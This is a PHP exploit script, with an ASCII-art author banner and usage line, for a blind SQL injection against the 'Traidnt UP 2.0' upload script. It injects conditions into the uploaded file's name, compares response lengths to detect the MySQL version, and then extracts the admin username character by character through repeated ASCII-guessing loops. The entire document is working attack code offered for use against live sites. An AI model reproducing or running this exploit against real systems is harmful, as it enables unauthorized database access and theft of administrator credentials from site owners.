&lt;?php
print_r(&#039;
                                       ||          ||   | ||
                                o_,_7 _||  . _o_7 _|| q_|_||  o_///_,
                               (  :  /    (_)    /           (      .
 
                                        ___________________
                                      _/QQQQQQQQQQQQQQQQQQQ\__
[q] Traidnt UP 2.0 Blind SQL Inj.  __/QQQ/````````````````\QQQ\___
                                 _/QQQQQ/                  \QQQQQQ\
[q] _FILES &lt;3                   /QQQQ/``                    ```QQQQ\
                               /QQQQ/                          \QQQQ\
[q] Magic Quotes == OFF!      |QQQQ/    By  Qabandi             \QQQQ|
                              |QQQQ|                            |QQQQ|
                              |QQQQ|    From Kuwait, PEACE...   |QQQQ|
                              |QQQQ|                            |QQQQ|
                              |QQQQ\       iqa[a]hotmail.fr     /QQQQ|
[/]   -[WHAT?]-                \QQQQ\                      __  /QQQQ/
                                \QQQQ\                    /QQ\_QQQQ/
                                 \QQQQ\                   \QQQQQQQ/
                                  \QQQQQ\                 /QQQQQ/_
                                   ``\QQQQQ\_____________/QQQ/\QQQQ\_
                                      ``\QQQQQQQQQQQQQQQQQQQ/  `\QQQQ\
                                         ```````````````````     `````
 ______________________________________________________________________________
/                                                                              \
|      Sec-Code.com ;)  Shru7at Iktshaf al-thaghrat Qareeban!!il7ag sajjil!!   |
\______________________________________________________________________________/
                                \ No More Private /
                                 `````````````````
USAGE: php whatever.php localhost /upload/
 
Will give you username and mysql version ONLY ;)
&#039;);
 
ini_set(&quot;max_execution_time&quot;,0);
 
 function QABANDI($victim,$vic_dir,$injection){
$host = $victim;
$p = &quot;http://&quot;.$host.$vic_dir;
$inj = $injection;
$content=&quot;qabandi&quot;;
 
$data=&#039;-----------------------------7d529a1d23092a
Content-Disposition: form-data; name=&quot;upfile_0&quot;; filename=&quot;q.jpg&#039;.$inj.&#039;&quot;
Content-Type: image/jpg
 
&#039;.$content.&#039;
-----------------------------7d529a1d23092a
Content-Disposition: form-data; name=&quot;tr_upload&quot;
 
upload
-----------------------------7d529a1d23092a--
&#039;;
 
 
 
 
          $packet =&quot;POST &quot;.$p.&quot;/upload.php?upload_range=1 HTTP/1.0\r\n&quot;;
          $packet.=&quot;Content-Type: multipart/form-data; boundary=---------------------------7d529a1d23092a\r\n&quot;;
          $packet.=&quot;User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\r\n&quot;;
          $packet.=&quot;Pragma: no-cache\r\n&quot;;
          $packet.=&quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
          $packet.=&quot;Connection: Close\r\n\r\n&quot;;
          $packet.=$data;
 
 
         //print $packet;
    $o = @fsockopen($host, 80);
    if(!$o){
        echo &quot;\n[x] No response...\n&quot;;
        die;
    }
     
    fputs($o, $packet);
    while (!feof($o)) $data .= fread($o, 1024);
    fclose($o);
     
    $_404 = strstr( $data, &quot;HTTP/1.1 404 Not Found&quot; );
    if ( !empty($_404) ){
        echo &quot;\n[x] 404 Not Found... Make sure of path. \n&quot;;
        die;
    }
 
                                           return $data;
 
 }
 
$host1 = $argv[1];
$userdir1=$argv[2];
 
 
$Truths = strlen(QABANDI($host1,$userdir1,&quot;&#039; and 1=&#039;1&quot;));
 
//echo &quot;truths = &quot;.round($Truths, -3);
$yes = round($Truths, -3);
 
$Falses = strlen(QABANDI($host1,$userdir1,&quot;&#039; and 1=&#039;q&quot;));
 
//echo &quot;\nfalses = &quot;.round($Falses, -3);
 
$no = round($Falses, -3);
 
if($yes == $no){
  echo &quot;Website not vulnerable\nMagic quotes Must be OFF!&quot;;
  die;
}
echo &quot;\n MySQL version =&quot;;
 
$sql4 = &quot;&#039; and substring(@@version,1,1)=&#039;4&quot;;
$sql5 = &quot;&#039; and substring(@@version,1,1)=&#039;5&quot;;
 
$myver4 = strlen(QABANDI($host1,$userdir1,$sql4));
$myver4 = round($myver4, -3);
 
 
$myver5 = strlen(QABANDI($host1,$userdir1,$sql5));
$myver5 = round($myver5, -3);
 
if( $myver5 == $yes ){
  echo &quot;5&quot;;
}
if( $myver4 == $yes ){
 echo &quot;4&quot;;
}
 
 
 
 echo &quot;\n Username: &quot;;
   for ($i = 46; $i &lt;= 122; $i++) {
 $ass = &quot;&#039; and ascii(substring((select admin_user from admin limit 0,1),1,1))=&#039;&quot;.$i;
      $zyklon = strlen(QABANDI($host1,$userdir1,$ass));
      $zyklon = round($zyklon, -3);
 
      if($zyklon == $yes){
       echo chr($i);
      }
   }
 
   for ($i = 46; $i &lt;= 122; $i++) {
 $ass = &quot;&#039; and ascii(substring((select admin_user from admin limit 0,1),2,1))=&#039;&quot;.$i;
      $zyklon = strlen(QABANDI($host1,$userdir1,$ass));
      $zyklon = round($zyklon, -3);
 
      if($zyklon == $yes){
       echo chr($i);
      }
   }
 
   for ($i = 46; $i &lt;= 122; $i++) {
 $ass = &quot;&#039; and ascii(substring((select admin_user from admin limit 0,1),3,1))=&#039;&quot;.$i;
      $zyklon = strlen(QABANDI($host1,$userdir1,$ass));
      $zyklon = round($zyklon, -3);
 
      if($zyklon == $yes){
       echo chr($i);
      }
   }
 
   for ($i = 46; $i &lt;= 122; $i++) {
 $ass = &quot;&#039; and ascii(substring((select admin_user from admin limit 0,1),4,1))=&#039;&quot;.$i;
      $zyklon = strlen(QABANDI($host1,$userdir1,$ass));
      $zyklon = round($zyklon, -3);
 
      if($zyklon == $yes){
       echo chr($i);
      }
   }
 
    for ($i = 46; $i &lt;= 122; $i++) {
 $ass = &quot;&#039; and ascii(substring((select admin_user from admin limit 0,1),5,1))=&#039;&quot;.$i;
      $zyklon = strlen(QABANDI($host1,$userdir1,$ass));
      $zyklon = round($zyklon, -3);
 
      if($zyklon == $yes){
       echo chr($i);
      }
   }
 
 
   for ($i = 46; $i &lt;= 122; $i++) {
 $ass = &quot;&#039; and ascii(substring((select admin_user from admin limit 0,1),6,1))=&#039;&quot;.$i;
      $zyklon = strlen(QABANDI($host1,$userdir1,$ass));
      $zyklon = round($zyklon, -3);
 
      if($zyklon == $yes){
       echo chr($i);
      }
   }
 
 
   for ($i = 46; $i &lt;= 122; $i++) {
 $ass = &quot;&#039; and ascii(substring((select admin_user from admin limit 0,1),7,1))=&#039;&quot;.$i;
      $zyklon = strlen(QABANDI($host1,$userdir1,$ass));
      $zyklon = round($zyklon, -3);
 
      if($zyklon == $yes){
       echo chr($i);
      }
   }
 
   for ($i = 46; $i &lt;= 122; $i++) {
 $ass = &quot;&#039; and ascii(substring((select admin_user from admin limit 0,1),8,1))=&#039;&quot;.$i;
      $zyklon = strlen(QABANDI($host1,$userdir1,$ass));
      $zyklon = round($zyklon, -3);
 
      if($zyklon == $yes){
       echo chr($i);
      }
   }
 
   for ($i = 46; $i &lt;= 122; $i++) {
 $ass = &quot;&#039; and ascii(substring((select admin_user from admin limit 0,1),9,1))=&#039;&quot;.$i;
      $zyklon = strlen(QABANDI($host1,$userdir1,$ass));
      $zyklon = round($zyklon, -3);
 
      if($zyklon == $yes){
       echo chr($i);
      }
   }
 
   for ($i = 46; $i &lt;= 122; $i++) {
 $ass = &quot;&#039; and ascii(substring((select admin_user from admin limit 0,1),10,1))=&#039;&quot;.$i;
      $zyklon = strlen(QABANDI($host1,$userdir1,$ass));
      $zyklon = round($zyklon, -3);
 
      if($zyklon == $yes){
       echo chr($i);
      }
   }
 
die;
 
 
?&gt;
